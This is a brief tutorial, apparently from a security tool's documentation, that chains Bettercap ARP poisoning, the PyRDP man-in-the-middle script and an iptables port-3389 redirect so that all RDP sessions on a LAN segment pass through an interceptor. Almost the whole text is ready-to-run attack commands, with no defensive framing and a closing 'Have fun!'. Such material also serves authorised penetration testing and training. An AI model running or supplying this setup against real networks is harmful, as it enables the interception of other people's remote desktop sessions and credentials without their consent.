# Run PyRDP alongisde Bettercap

Here is a short tutorial on how to combine the MITM RPD tool and Bettercap to
redirect all RDP sessions on a LAN segment. By default Bettercap poisons only
the gateway so connections will need to cross the gateway for them to be
poisoned.

Start bettercap in normal mode (you can use other options if you like).

    bettercap -I <interface>

Run the PyRDP mitm

    python3 bin/pyrdp-mitm.py <dst-rdp-machine>

Add this iptables rule to redirect all traffic to the mitm

    iptables -t nat -A PREROUTING -p tcp --dport 3389 -j REDIRECT --to-ports 3389

Have fun!

Once finished you can remove the iptables rule with

    iptables -t nat -D PREROUTING -p tcp --dport 3389 -j REDIRECT --to-ports 3389
